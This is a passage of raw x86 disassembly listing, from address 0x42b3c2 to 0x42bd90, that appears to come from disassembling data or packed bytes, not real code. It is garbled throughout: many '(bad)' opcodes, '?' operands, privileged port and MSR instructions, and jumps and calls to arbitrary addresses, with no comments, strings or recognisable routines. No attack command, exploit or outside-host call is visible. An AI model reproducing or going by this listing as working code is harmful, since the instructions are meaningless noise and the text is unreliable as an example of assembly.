  42b3c2:	dec    edi
  42b3c3:	adc    cl,ch
  42b3c5:	out    0x7e,al
  42b3c7:	les    edx,FWORD PTR [ecx]
  42b3c9:	and    BYTE PTR fs:[eax+eax*1],0x0
	...
  42b3ea:	jge    0x42b3d2
  42b3ec:	(bad)  
  42b3ed:	inc    DWORD PTR [edx+ebx*1+0x985020]
  42b3f4:	sub    eax,0x6c502520
  42b3f9:	inc    eax
  42b3fa:	xor    DWORD PTR [ecx+edi*1],edi
  42b3fd:	push   ebx
  42b3fe:	inc    edx
  42b3ff:	jge    0x42b466
  42b401:	and    BYTE PTR [ebp+0x3d03e902],al
  42b407:	jns    0x42b3fe
  42b409:	pop    ds
  42b40a:	cmp    eax,ebx
  42b40c:	jecxz  0x42b417
  42b40e:	or     eax,0x41c46400
  42b413:	ror    DWORD PTR es:[ebx-0x916ffee],1
  42b41a:	inc    ecx
  42b41b:	and    al,0xf5
  42b41d:	neg    BYTE PTR [eax]
  42b41f:	or     al,0xf6
  42b421:	inc    ebx
  42b422:	or     eax,0x11fbdef
  42b427:	jnp    0x42b41d
  42b429:	dec    DWORD PTR [ebx]
  42b42b:	inc    eax
  42b42c:	jmp    0xb6327427
  42b431:	pop    ds
  42b432:	and    eax,0xc9be3bef
  42b437:	and    ebp,edx
  42b439:	add    al,0xca
  42b43b:	push   edx
  42b43c:	mov    dh,0x6b
  42b43e:	jb     0x42b43f
  42b440:	call   0x75581a48
  42b445:	adc    ch,cl
  42b447:	jmp    FWORD PTR [eax+0x78]
  42b44a:	xor    edi,edi
  42b44c:	out    0x70,eax
	...
  42b46a:	add    BYTE PTR [eax],al
  42b46c:	mov    dh,0xee
  42b46e:	xor    eax,0xe901e520
  42b473:	add    edx,DWORD PTR [eax+0xdf80584]
  42b479:	add    cl,ch
  42b47b:	idiv   BYTE PTR [ecx+0x24]
  42b47e:	int    0x3
  42b480:	or     eax,0xe93f7000
  42b485:	das    
  42b486:	ins    BYTE PTR es:[edi],dx
  42b487:	aas    
  42b488:	icebp  
  42b489:	das    
  42b48a:	add    BYTE PTR [ecx],bl
  42b48c:	sbb    dh,BYTE PTR [esp-0x33]
  42b490:	retf   
  42b491:	inc    ebx
  42b492:	and    al,0xe5
  42b494:	imul   eax,edi,0x3e
  42b497:	jmp    0x2966f857
  42b49c:	mov    eax,ds:0xabe93e2c
  42b4a1:	inc    ebx
  42b4a2:	and    al,0x2d
  42b4a4:	mov    eax,ds:0x9be93ec5
  42b4a9:	inc    ebx
  42b4aa:	and    al,0x21
  42b4ac:	mov    ch,0xc5
  42b4ae:	ds jmp 0xb566f83f
  42b4b4:	out    dx,eax
  42b4b5:	(bad)  
  42b4b6:	ds jmp 0xb966f837
  42b4bc:	push   esi
  42b4bd:	(bad)  
  42b4be:	ds jmp 0x9d66f82f
  42b4c4:	sub    eax,edi
  42b4c6:	ds jmp 0x36ae4572
  42b4cc:	fwait
  42b4cd:	add    DWORD PTR gs:[eax+eax*1+0x0],ebx
	...
  42b4ee:	or     ah,BYTE PTR [esp+edi*8]
  42b4f1:	jmp    0x512ab504
  42b4f6:	mov    ecx,0xd561ffff
  42b4fb:	test   DWORD PTR [esi-0x17eff56b],0xfbe9637a
  42b505:	jb     0x42b4f1
  42b507:	and    edx,DWORD PTR [ecx+eax*1]
  42b50a:	in     al,0x2
  42b50c:	sti    
  42b50d:	out    dx,al
  42b50e:	(bad)  
  42b510:	fcomp  QWORD PTR [eax+0x9]
  42b513:	add    BYTE PTR [ebx+0x3f],bl
  42b516:	cld    
  42b517:	mov    edi,0x4c526257
  42b51c:	mov    esi,0x87550ee5
  42b521:	add    BYTE PTR [eax],bh
  42b523:	sub    ah,0x38
  42b526:	add    al,BYTE PTR es:[eax]
  42b529:	push   ebx
  42b52a:	xacquire xchg BYTE PTR [ebp-0x48],dh
  42b52e:	int3   
  42b52f:	mov    DWORD PTR [ecx],edi
  42b531:	jmp    FWORD PTR [ebx+0x12085d77]
  42b537:	jg     0x42b5ac
  42b539:	dec    esp
  42b53a:	in     al,0xab
  42b53c:	inc    ebp
  42b53d:	push   esp
  42b53f:	add    al,0x84
  42b541:	mov    ?,ebp
  42b543:	add    DWORD PTR [eax],eax
  42b545:	lea    esp,[edi]
  42b547:	or     al,0x89
  42b549:	inc    ebp
  42b54a:	mov    WORD PTR [ebx],?
  42b54c:	div    DWORD PTR [ebp-0x74]
  42b54f:	dec    esi
  42b550:	add    DWORD PTR [ebx+0x0],0x0
	...
  42b570:	jle    0x42b54b
  42b572:	pusha  
  42b573:	add    al,0x5b
  42b575:	repz cmp eax,0x2d
  42b579:	jne    0x42b573
  42b57b:	sbb    DWORD PTR [ebx-0xd],0x75
  42b57f:	and    al,0xe2
  42b581:	inc    BYTE PTR [eax]
  42b583:	wrmsr  
  42b585:	dec    ebx
  42b586:	add    DWORD PTR [eax],eax
  42b588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b589:	pop    ecx
  42b58a:	mov    BYTE PTR [ebx],dl
  42b58c:	je     0x42b58f
  42b58e:	div    DWORD PTR ds:0x3be028
  42b594:	sbb    edi,ebp
  42b596:	sbb    edx,DWORD PTR [ebx]
  42b598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b599:	add    DWORD PTR ds:0x17502,edi
  42b59f:	jmp    0x42b859
  42b5a4:	sbb    ecx,0xffffff80
  42b5a7:	and    BYTE PTR [ecx+eax*1+0x4f],ah
  42b5ab:	call   0x42d72c
  42b5b0:	mov    ecx,0x5bfdc89d
  42b5b5:	hlt    
  42b5b6:	call   0xf53ac318
  42b5bb:	sti    
  42b5bc:	cwde   
  42b5bd:	fs ret 
  42b5bf:	std    
  42b5c0:	and    al,dh
  42b5c2:	dec    edi
  42b5c3:	lea    esp,[eax+0x12c8808a]
  42b5c9:	mov    edi,0xd70d61bc
  42b5ce:	xchg   DWORD PTR [ebp+0x3],eax
  42b5d1:	pop    ebx
  42b5d2:	mov    edi,0x74
	...
  42b5ef:	add    BYTE PTR [eax],al
  42b5f1:	add    BYTE PTR [edi],ah
  42b5f3:	jb     0x42b5f5
  42b5f5:	sti    
  42b5f6:	js     0x42b5ab
  42b5f8:	mov    BYTE PTR [ebp-0xf],dh
  42b5fb:	ret    0xafe
  42b5fe:	fwait
  42b5ff:	xchg   esi,eax
  42b600:	in     al,dx
  42b601:	fdiv   st,st(6)
  42b603:	xchg   esi,eax
  42b604:	add    BYTE PTR [edi+0x9],0xba
  42b608:	mov    esi,0xfe276250
  42b60d:	out    0xfb,eax
  42b60f:	in     eax,dx
  42b610:	hlt    
  42b611:	sti    
  42b612:	mov    bl,dl
  42b614:	ror    DWORD PTR [eax-0x7d18aab8],cl
  42b61a:	sub    al,0xd7
  42b61c:	(bad)  
  42b61d:	mov    eax,0xffffd7b3
  42b622:	mov    BYTE PTR [ebx-0x39],ah
  42b625:	std    
  42b626:	xchg   edx,eax
  42b627:	xor    eax,0x970d00bd
  42b62c:	inc    esi
  42b62d:	jne    0x42b5b3
  42b62f:	fiadd  WORD PTR [edx-0x6]
  42b632:	or     ah,BYTE PTR [ebx-0x41]
  42b635:	add    BYTE PTR ds:0xf70069d7,cl
  42b63b:	(bad)  
  42b63c:	add    BYTE PTR [ebp+0x65],0x86
  42b640:	xor    al,al
  42b642:	gs push 0xfffffffa
  42b645:	cli    
  42b646:	push   edx
  42b647:	mov    cl,0x3a
  42b649:	clc    
  42b64a:	sbb    ah,BYTE PTR [edi+eiz*4+0x0]
  42b64e:	or     eax,0xb87ee900
  42b653:	out    0x51,eax
  42b655:	xor    al,0x0
	...
  42b673:	add    BYTE PTR [eax+0x105de8ff],bh
  42b679:	jnp    0x42b69f
  42b67b:	hlt    
  42b67c:	mov    ebp,0x16063cd7
  42b681:	in     al,dx
  42b682:	les    ebx,FWORD PTR gs:[ecx-0x7778b4fa]
  42b689:	lock in al,0x78
  42b68c:	adc    edi,ebx
  42b68e:	pop    ecx
  42b68f:	dec    ecx
  42b690:	jmp    0x42b6e5
  42b692:	ins    BYTE PTR es:[edi],dx
  42b693:	push   ecx
  42b694:	loope  0x42b66e
  42b696:	or     eax,0x5eebe61a
  42b69b:	push   ecx
  42b69c:	adc    eax,0xcd35e7d7
  42b6a1:	test   BYTE PTR [ecx+0x3afb6378],ch
  42b6a7:	dec    ecx
  42b6a8:	sar    DWORD PTR [eax],0x21
  42b6ab:	js     0x42b6b8
  42b6ad:	cmp    BYTE PTR [ecx-0x5b3d9e88],dh
  42b6b3:	repnz or al,0xd7
  42b6b6:	mov    ds:0x576d2a69,eax
  42b6bb:	or     BYTE PTR [eax],bl
  42b6bd:	inc    ebx
  42b6be:	je     0x42b709
  42b6c0:	push   ebp
  42b6c1:	fcom   DWORD PTR [eax-0x401469d4]
  42b6c7:	push   eax
  42b6c9:	imul   DWORD PTR [ecx]
  42b6cb:	cmp    DWORD PTR [ebp-0x2e],esp
  42b6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6cf:	add    esi,DWORD PTR [esi+0x15]
  42b6d2:	lds    edx,FWORD PTR [ecx*8+0xf45dff]
	...
  42b6f5:	add    BYTE PTR [eax-0x75e36a0e],dl
  42b6fb:	inc    ebp
  42b6fc:	adc    eax,0x70520d5e
  42b701:	adc    cl,BYTE PTR [edx-0x1d7f0000]
  42b707:	sti    
  42b708:	cmp    eax,0xffffe6e9
  42b70d:	jmp    0x3db1:0xa17d7d0e
  42b714:	add    al,0xc1
  42b716:	push   ds
  42b717:	sub    bl,bh
  42b719:	into   
  42b71a:	mov    al,al
  42b71c:	jne    0x42b70d
  42b71e:	mov    ah,0xd7
  42b720:	dec    eax
  42b721:	cmp    DWORD PTR [ecx],ecx
  42b723:	add    bl,bh
  42b725:	cmp    al,0xed
  42b727:	xlat   BYTE PTR ds:[ebx]
  42b728:	inc    eax
  42b729:	cmp    DWORD PTR [ecx],ecx
  42b72b:	add    BYTE PTR [eax+0xafffe24],al
  42b731:	gs dec esi
  42b733:	out    0xfb,eax
  42b735:	xchg   esi,eax
  42b736:	imul   esi,DWORD PTR [ebp-0x8],0xffffff81
  42b73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b73b:	add    al,0xfb
  42b73d:	xchg   BYTE PTR [esi+0x55e9fb6c],cl
  42b743:	stc    
  42b744:	icebp  
  42b745:	jmp    0xe6bc:0xf384f711
  42b74c:	sti    
  42b74d:	(bad)  
  42b74e:	lea    esi,[eax+edi*4+0x51]
  42b752:	cmp    BYTE PTR [ecx],ch
  42b754:	sti    
  42b755:	push   esi
  42b756:	lahf   
  42b757:	pop    edx
  42b758:	push   eax
  42b759:	inc    ecx
	...
  42b776:	add    BYTE PTR [eax],al
  42b778:	dec    esp
  42b779:	jl     0x42b775
  42b77b:	inc    esi
  42b77c:	inc    ebx
  42b77d:	fmul   DWORD PTR [eax]
  42b77f:	mov    ecx,0x2f87000e
  42b784:	data16 fidiv DWORD PTR [ebx]
  42b787:	cs jg  0x42b7cf
  42b78a:	das    
  42b78b:	sub    ebx,ecx
  42b78d:	mov    eax,0x550ee5be
  42b792:	xchg   DWORD PTR ds:0xba74db93,eax
  42b798:	les    ecx,FWORD PTR [esi+0x66]
  42b79b:	add    BYTE PTR [edi+0x7f],bl
  42b79e:	jne    0x42b76c
  42b7a0:	lods   al,BYTE PTR ds:[esi]
  42b7a1:	(bad)  
  42b7a2:	sub    esi,esi
  42b7a4:	inc    ebx
  42b7a5:	lock xor DWORD PTR [ebp+0x2c],0xffffff81
  42b7aa:	gs cld 
  42b7ac:	and    al,0xe8
  42b7ae:	inc    BYTE PTR [eax]
  42b7b0:	fiadd  WORD PTR [ecx]
  42b7b2:	push   ebx
  42b7b3:	je     0x42b7d9
  42b7b5:	dec    esp
  42b7b6:	adc    BYTE PTR [ebp-0x72b00816],cl
  42b7bc:	shr    edi,1
  42b7be:	add    ebx,0x3c
  42b7c1:	lock pushf 
  42b7c3:	add    ah,dh
  42b7c5:	push   0x76
  42b7c7:	sbb    BYTE PTR [ebx],bl
  42b7c9:	out    dx,eax
  42b7ca:	adc    eax,0x3df6c4
  42b7cf:	push   eax
  42b7d0:	cmp    ebp,DWORD PTR [ecx+0x7d]
  42b7d3:	hlt    
  42b7d4:	outs   dx,DWORD PTR ds:[esi]
  42b7d5:	ret    
  42b7d6:	call   0x4728c4
  42b7db:	push   ebx
	...
  42b7f8:	add    BYTE PTR [eax],al
  42b7fa:	popa   
  42b7fb:	ss inc edx
  42b7fd:	push   eax
  42b7fe:	popa   
  42b7ff:	pop    ecx
  42b800:	clc    
  42b801:	mov    esi,DWORD PTR [edi-0x34]
  42b804:	rcr    BYTE PTR [esp+esi*4+0x2c75f6fd],cl
  42b80b:	imul   eax,DWORD PTR [ebp-0x34],0x8df47153
  42b812:	shr    DWORD PTR [ecx-0x9],0x75
  42b816:	push   eax
  42b817:	push   esp
  42b818:	bound  esp,QWORD PTR [eax]
  42b81a:	outs   dx,DWORD PTR ds:[esi]
  42b81b:	vdivps xmm4,xmm6,XMMWORD PTR [ebp+edi*8-0x7b9b3b86]
  42b824:	clc    
  42b825:	pop    ds
  42b826:	arpl   WORD PTR [edx-0x29bff52],ax
  42b82c:	add    bh,0xb4
  42b82f:	dec    ebx
  42b830:	add    DWORD PTR [eax+0xd],ebp
  42b833:	scas   eax,DWORD PTR es:[edi]
  42b834:	sar    DWORD PTR [edi],1
  42b836:	or     eax,0xfe2012fa
  42b83b:	xchg   esi,eax
  42b83c:	dec    DWORD PTR [eax-0x3f7d1138]
  42b842:	sbb    bl,BYTE PTR [ebx-0x73]
  42b845:	add    BYTE PTR ds:0x915f0d7,cl
  42b84b:	out    0x3f,al
  42b84d:	add    al,dh
  42b84f:	xchg   ecx,eax
  42b850:	(bad)  
  42b851:	dec    DWORD PTR ds:0x98fafb4c
  42b857:	fdivrp st(0),st
  42b859:	adc    eax,0x3fc611
	...
  42b87a:	add    BYTE PTR [eax],al
  42b87c:	mov    es,WORD PTR [esp+edi*8-0x1]
  42b880:	(bad)  
  42b881:	xor    edi,esp
  42b883:	(bad)  
  42b884:	jle    0x42b8b4
  42b886:	pop    edx
  42b887:	pop    eax
  42b888:	addr16 out dx,eax
  42b88a:	lock xor eax,0x44b0d5
  42b890:	jmp    0x7cd7:0x4d1123eb
  42b897:	clc    
  42b898:	nop
  42b899:	xor    DWORD PTR [ebx+0x5d],0x123bcb86
  42b8a0:	dec    ebp
  42b8a1:	xlat   BYTE PTR ds:[ebx]
  42b8a2:	pop    ebp
  42b8a3:	adc    BYTE PTR [eax-0x77aff7e0],dl
  42b8a9:	cdq    
  42b8aa:	add    edx,DWORD PTR [eax-0x4e]
  42b8ad:	and    eax,0xd37027c
  42b8b2:	ja     0x42b8b7
  42b8b4:	mov    fs,WORD PTR [eax]
  42b8b6:	adc    ecx,DWORD PTR [ebp+0x5059cb52]
  42b8bc:	xchg   edx,eax
  42b8bd:	add    eax,0x5615457c
  42b8c2:	ret    
  42b8c3:	sbb    bl,ch
  42b8c5:	push   ebp
  42b8c6:	jo     0x42b914
  42b8c8:	or     eax,0xdd487000
  42b8cd:	jae    0x42b893
  42b8cf:	and    esi,0x7
  42b8d2:	jmp    0x66a4bf4e
  42b8d7:	jo     0x42b8ac
  42b8d9:	(bad)  
  42b8da:	jl     0x42b8e7
  42b8dc:	mov    esi,0xc357
	...
  42b8fd:	add    BYTE PTR [ebx],cl
  42b8ff:	add    BYTE PTR [ecx-0x1707f2fd],al
  42b905:	fstp   TBYTE PTR [edi+0x0]
  42b908:	jmp    0x56024110
  42b90d:	or     BYTE PTR [ebp-0x2],bl
  42b910:	mov    ebp,0x9ad7be14
  42b915:	pop    esi
  42b916:	or     eax,0x579c200
  42b91b:	fsub   st,st(2)
  42b91d:	jp     0x42b926
  42b91f:	call   0x46a97d1b
  42b924:	push   cs
  42b925:	mov    ebp,0x58e8fcbb
  42b92a:	mov    dl,ah
  42b92c:	callw  0x3d15
  42b930:	test   DWORD PTR [eax+0x52],esp
  42b933:	dec    esi
  42b934:	xor    bl,BYTE PTR [edx-0x25]
  42b937:	pop    edi
  42b938:	enter  0x1118,0x6c
  42b93c:	xchg   ecx,eax
  42b93d:	xchg   edi,eax
  42b93e:	fiadd  WORD PTR [eax]
  42b940:	jmp    0xcd5f02c1
  42b945:	mov    ch,cl
  42b947:	ins    DWORD PTR es:[edi],dx
  42b948:	jmp    0x42b98d
  42b94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b94b:	push   edi
  42b94c:	call   0x589cc654
  42b951:	out    dx,eax
  42b952:	clc    
  42b953:	push   edi
  42b954:	test   DWORD PTR [ebx+0xd],0x2d194250
  42b95b:	adc    ch,BYTE PTR [ecx+0xac7503]
  42b961:	adc    DWORD PTR [eax],eax
	...
  42b97f:	add    BYTE PTR [ecx],cl
  42b981:	add    BYTE PTR [ecx+ebp*1-0x17b77c86],al
  42b988:	push   cs
  42b989:	add    cl,ch
  42b98b:	(bad)  
  42b98c:	adc    DWORD PTR [eax],eax
  42b98e:	add    BYTE PTR [edx-0x33],ah
  42b991:	sbb    edx,DWORD PTR [eax]
  42b993:	pop    esp
  42b994:	mov    ch,0x1b
  42b996:	adc    al,0x11
  42b998:	lds    ecx,FWORD PTR [eax+0x0]
  42b99b:	jmp    0xe566f569
  42b9a0:	(bad)  
  42b9a4:	xchg   edx,eax
  42b9a5:	pushf  
  42b9a6:	add    cl,ch
  42b9a8:	push   cs
  42b9a9:	addr16 fs add eax,0x3965fff1
  42b9b0:	mov    WORD PTR [esp],?
  42b9b3:	add    DWORD PTR [edi-0x3a2eb001],esi
  42b9b9:	inc    esp
  42b9ba:	add    ecx,ebp
  42b9bc:	xchg   DWORD PTR [esp+0x9],esp
  42b9c0:	mov    ?,WORD PTR [ebx+0x1c6a6a0c]
  42b9c6:	or     al,0xed
  42b9c8:	jne    0x42ba38
  42b9ca:	sti    
  42b9cb:	(bad)  
  42b9cc:	sti    
  42b9cd:	or     al,0xc4
  42b9cf:	sti    
  42b9d0:	dec    esi
  42b9d1:	add    BYTE PTR [edi-0x6f],bh
  42b9d4:	cs ins DWORD PTR es:[edi],dx
  42b9d6:	ins    DWORD PTR es:[edi],dx
  42b9d7:	jb     0x42b9f4
  42b9d9:	jne    0x42ba27
  42b9db:	vunpckhps xmm2,xmm1,xmm7
  42b9df:	arpl   WORD PTR [eax],cx
  42b9e1:	jne    0x42ba33
  42b9e3:	cdq    
	...
  42ba00:	add    BYTE PTR [eax],al
  42ba02:	mov    gs,ebp
  42ba04:	or     esi,ebx
  42ba06:	or     bh,BYTE PTR [esi-0x42]
  42ba09:	push   edx
  42ba0a:	add    BYTE PTR [ebp+0x50],dh
  42ba0d:	xchg   esi,eax
  42ba0e:	mov    gs,ebp
  42ba10:	add    eax,0xc8fc12d6
  42ba15:	add    BYTE PTR [edi],bh
  42ba17:	jmp    0x832e0aa8
  42ba1c:	repnz add eax,0xa9040dc3
  42ba22:	lock mov ecx,0xfb7c0774
  42ba28:	inc    eax
  42ba29:	xor    cl,bh
  42ba2b:	leave  
  42ba2c:	(bad)  
  42ba2d:	mov    edi,0x187ff14
  42ba32:	mov    bh,0xfb
  42ba34:	cmp    eax,0xc07f23eb
  42ba39:	jne    0x42ba97
  42ba3b:	jle    0x42ba10
  42ba3d:	jne    0x42ba8f
  42ba3f:	mov    ebp,0xfb442444
  42ba44:	(bad)  
  42ba45:	jmp    DWORD PTR [ebx+edx*8]
  42ba48:	outs   dx,DWORD PTR ds:[esi]
  42ba49:	or     BYTE PTR [edi-0x3c00f394],bl
  42ba4f:	test   DWORD PTR [esp+ebx*2+0x7fe83010],0x8df7d44c
  42ba5a:	xor    BYTE PTR [eax],bl
  42ba5c:	and    BYTE PTR [eax-0x34],dl
  42ba5f:	test   eax,0x67abfffd
  42ba64:	inc    esp
  42ba65:	and    al,0x0
	...
  42ba83:	add    al,bh
  42ba85:	leave  
  42ba86:	aad    0x6d
  42ba88:	hlt    
  42ba89:	add    DWORD PTR [ebp+0x5011d044],ecx
  42ba8f:	call   0x39d9e9
  42ba94:	popa   
  42ba95:	mov    esp,0xd4848507
  42ba9a:	idiv   edi
  42ba9c:	sub    DWORD PTR [eax],edi
  42ba9e:	and    al,0x18
  42baa0:	adc    al,0xc4
  42baa2:	nop
  42baa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42baa4:	sub    dl,bl
  42baa6:	sbb    eax,0x31
  42baa9:	mov    bh,0x74
  42baab:	inc    edi
  42baac:	or     eax,0xf5247062
  42bab1:	pop    ebx
  42bab2:	in     eax,dx
  42bab3:	je     0x42ba89
  42bab5:	jno    0x42baa8
  42bab7:	jg     0x42baaa
  42bab9:	cli    
  42baba:	and    eax,DWORD PTR [eax]
  42babc:	test   DWORD PTR [esi-0xcebb86],0xedd0055
  42bac6:	jae    0x42bb24
  42bac8:	or     al,0xd7
  42baca:	add    ah,0x11
  42bacd:	sub    DWORD PTR [ecx],0x27bad18d
  42bad3:	push   edx
  42bad4:	mov    ebp,0x234c12fd
  42bad9:	xchg   edi,eax
  42bada:	(bad)  
  42badb:	jle    0x42bb26
  42badd:	fstp   TBYTE PTR [edx+0x44]
  42bae0:	icebp  
  42bae1:	mov    dh,0x4f
  42bae3:	call   0xfc2f9696
	...
  42bb04:	add    BYTE PTR [eax],al
  42bb06:	mov    ds,WORD PTR [ebp-0x6067b4d7]
  42bb0c:	push   eax
  42bb0d:	call   0x46decf
  42bb12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb13:	out    0x72,al
  42bb15:	add    BYTE PTR ds:0xe9fc32a6,cl
  42bb1b:	sbb    DWORD PTR [ebx+edi*8],eax
  42bb1e:	and    BYTE PTR [ebx-0x23f2bff0],dh
  42bb24:	add    DWORD PTR [ecx],eax
  42bb26:	or     eax,0x6683fcd7
  42bb2b:	mov    gs,esp
  42bb2d:	sti    
  42bb2e:	fimul  DWORD PTR [edx]
  42bb30:	sub    BYTE PTR [eiz*8-0x350588ef],bl
  42bb37:	test   eax,0x12635bbf
  42bb3c:	jns    0x42bb23
  42bb3e:	pop    eax
  42bb3f:	cdq    
  42bb40:	add    eax,DWORD PTR [eax]
  42bb42:	pop    eax
  42bb43:	add    BYTE PTR [esi-0x21],ch
  42bb46:	sub    dl,ah
  42bb48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb49:	push   eax
  42bb4a:	aas    
  42bb4b:	dec    ebp
  42bb4c:	push   edx
  42bb4d:	jbe    0x42bb58
  42bb4f:	jae    0x42bafd
  42bb51:	scas   eax,DWORD PTR es:[edi]
  42bb52:	xchg   esi,eax
  42bb53:	push   0xfffffff1
  42bb55:	js     0x42bbd4
  42bb57:	xlat   BYTE PTR ds:[ebx]
  42bb58:	jg     0x42bb4e
  42bb5a:	xchg   ah,ah
  42bb5c:	data16 data16 jne 0x42bb5f
  42bb60:	pop    ebx
  42bb61:	inc    esi
  42bb62:	jno    0x42bbb3
  42bb64:	adc    esi,ebx
  42bb66:	mov    cl,0xe5
  42bb68:	sbb    bh,BYTE PTR [eax+0x0]
	...
  42bb87:	add    BYTE PTR [ebp+0x76],al
  42bb8a:	mov    ah,0xfb
  42bb8c:	xchg   ecx,eax
  42bb8d:	enter  0xc94,0x80
  42bb91:	cmp    al,BYTE PTR [ebp+0x53]
  42bb94:	cli    
  42bb95:	mov    edi,0x9b25dba9
  42bb9a:	repz jmp 0x42bb30
  42bb9d:	(bad)  
  42bb9e:	pop    esp
  42bb9f:	jbe    0x42bbd6
  42bba1:	xlat   BYTE PTR ds:[ebx]
  42bba2:	push   ecx
  42bba3:	mov    BYTE PTR [edi],ah
  42bba5:	in     al,0x3a
  42bba7:	dec    edx
  42bba8:	mov    eax,eax
  42bbaa:	cs mov ebp,0x7ee8f75b
  42bbb0:	cwde   
  42bbb1:	jecxz  0x42bc19
  42bbb3:	popa   
  42bbb4:	sbb    DWORD PTR [eax],eax
  42bbb6:	fs bnd jns 0x42bbeb
  42bbba:	outs   dx,DWORD PTR fs:[esi]
  42bbbc:	aas    
  42bbbd:	jne    0x42bbe3
  42bbbf:	les    ebx,FWORD PTR [ebp+0x75]
  42bbc2:	xor    bh,BYTE PTR [edx+0x45033f5]
  42bbc8:	or     eax,0xa71a97d
  42bbcd:	pop    edx
  42bbce:	pop    esi
  42bbcf:	add    ebp,DWORD PTR [edi+0x27]
  42bbd2:	sub    al,0xf6
  42bbd4:	inc    eax
  42bbd5:	test   BYTE PTR [edx],0x7f
  42bbd8:	dec    esi
  42bbd9:	(bad)  
  42bbda:	dec    DWORD PTR [esi]
  42bbdc:	jmp    0x45e6:0xf5f5f43c
  42bbe3:	cmc    
  42bbe4:	xchg   ebx,eax
  42bbe5:	mov    edi,0xf41c2036
  42bbea:	ins    DWORD PTR es:[edi],dx
  42bbeb:	cmp    eax,DWORD PTR [eax]
	...
  42bc09:	add    BYTE PTR [edx],bh
  42bc0b:	out    dx,al
  42bc0c:	ss pop esp
  42bc0e:	dec    esp
  42bc0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc10:	push   eax
  42bc11:	sar    DWORD PTR [eax],cl
  42bc13:	dec    ebx
  42bc14:	lea    edi,[edx+ebp*2+0x4ce14575]
  42bc1b:	cmp    eax,0x6cf1e90b
  42bc20:	cld    
  42bc21:	adc    DWORD PTR [ecx],eax
  42bc23:	push   ebp
  42bc24:	add    cl,ch
  42bc26:	(bad)  
  42bc27:	shl    BYTE PTR [ebx+edi*8-0x25],0x3c
  42bc2c:	cld    
  42bc2d:	fidivr DWORD PTR [eax]
  42bc2f:	out    dx,eax
  42bc30:	out    dx,eax
  42bc31:	push   es
  42bc32:	mov    esp,0x6d63e7f7
  42bc37:	out    0xfb,al
  42bc39:	popa   
  42bc3a:	int3   
  42bc3b:	idiv   dl
  42bc3d:	je     0x42bc75
  42bc3f:	fistp  DWORD PTR [ebp+edx*2+0x11]
  42bc43:	add    BYTE PTR [esi+0x71d8263c],al
  42bc49:	(bad)  
  42bc4a:	daa    
  42bc4b:	out    0x4f,eax
  42bc4d:	rcl    esp,0x53
  42bc50:	add    cl,ch
  42bc52:	inc    eax
  42bc53:	retf   
  42bc54:	jmp    0xfc29b29e
  42bc59:	pop    ds
  42bc5a:	jp     0x42bc4d
  42bc5c:	test   DWORD PTR [edi-0x16818109],esi
  42bc62:	push   cs
  42bc63:	add    BYTE PTR [esi+0x74b262f7],al
  42bc69:	adc    eax,0xdac9133e
	...
  42bc8a:	add    BYTE PTR [eax],al
  42bc8c:	out    0x7f,eax
  42bc8e:	test   BYTE PTR [eax],0x84
  42bc91:	outs   dx,DWORD PTR ds:[esi]
  42bc92:	or     ecx,DWORD PTR [edx-0x58002e6]
  42bc98:	mov    esp,0x3e800552
  42bc9d:	aaa    
  42bc9e:	jne    0x42bca6
  42bca0:	mov    esi,0xb6c67ae2
  42bca5:	xor    eax,0x679a8a4b
  42bcaa:	push   edx
  42bcab:	shl    BYTE PTR [edx+edx*8],1
  42bcae:	or     DWORD PTR [edi+0x64],esi
  42bcb1:	pusha  
  42bcb2:	pop    es
  42bcb3:	mov    esi,0x4e1bc26
  42bcb8:	dec    edx
  42bcb9:	stc    
  42bcba:	shl    DWORD PTR [esi-0x19],0xc3
  42bcbe:	xor    bl,ch
  42bcc0:	inc    edx
  42bcc1:	addr16 push edx
  42bcc3:	mov    edi,0x7705d1f4
  42bcc8:	push   esp
  42bcc9:	pusha  
  42bcca:	pop    es
  42bccb:	mov    esi,0x4e1bc16
  42bcd0:	call   0x2fc3:0xb766c1f9
  42bcd7:	jmp    0x42bd33
  42bcd9:	addr16 push edx
  42bcdb:	lahf   
  42bcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcdd:	rol    DWORD PTR ds:0x7602877,1
  42bce3:	mov    esi,0x4e1be66
  42bce8:	retf   0xc1fc
  42bceb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42bced:	(bad)  
  42bcee:	dec    edi
  42bcef:	sldt   WORD PTR [eax]
	...
  42bd0e:	mov    esp,DWORD PTR [ebp+0x3386eb3e]
  42bd14:	test   dl,dl
  42bd16:	cmp    bl,bh
  42bd18:	jp     0x42bce9
  42bd1a:	in     eax,0x5f
  42bd1c:	mov    DWORD PTR [eax],ecx
  42bd1e:	pop    edi
  42bd1f:	mov    edi,0x2bb75e57
  42bd24:	leave  
  42bd25:	push   0xd
  42bd27:	fbld   TBYTE PTR [ecx-0x77]
  42bd2a:	add    eax,0x90bf462f
  42bd2f:	test   DWORD PTR [eax+0x54],esi
  42bd32:	xchg   edi,eax
  42bd33:	in     eax,dx
  42bd34:	jnp    0x42bcff
  42bd36:	inc    ecx
  42bd37:	sbb    DWORD PTR ds:0x13708dc0,esi
  42bd3d:	jne    0x42bd4f
  42bd3f:	int    0x5
  42bd41:	pop    eax
  42bd42:	mov    dh,0xdc
  42bd44:	jg     0x42bd3f
  42bd46:	out    0xc3,al
  42bd48:	(bad)  
  42bd49:	cmp    eax,0xe7ee063b
  42bd4e:	and    dl,BYTE PTR [edi-0x19]
  42bd51:	cmp    DWORD PTR [edx],eax
  42bd53:	loopne 0x42bdb1
  42bd55:	repnz pop es
  42bd57:	mov    cl,0xf8
  42bd59:	mov    ecx,0xf104b944
  42bd5e:	repz push ebp
  42bd60:	(bad)  
  42bd61:	xor    BYTE PTR [edx],dl
  42bd63:	dec    edx
  42bd64:	out    dx,al
  42bd65:	ds xchg ebp,ebx
  42bd68:	jg     0x42bd63
  42bd6a:	sbb    eax,0x5484e574
  42bd6f:	arpl   WORD PTR [edi+edi*2],ax
	...
  42bd8e:	add    BYTE PTR [eax],al
  42bd90:	push   ebp
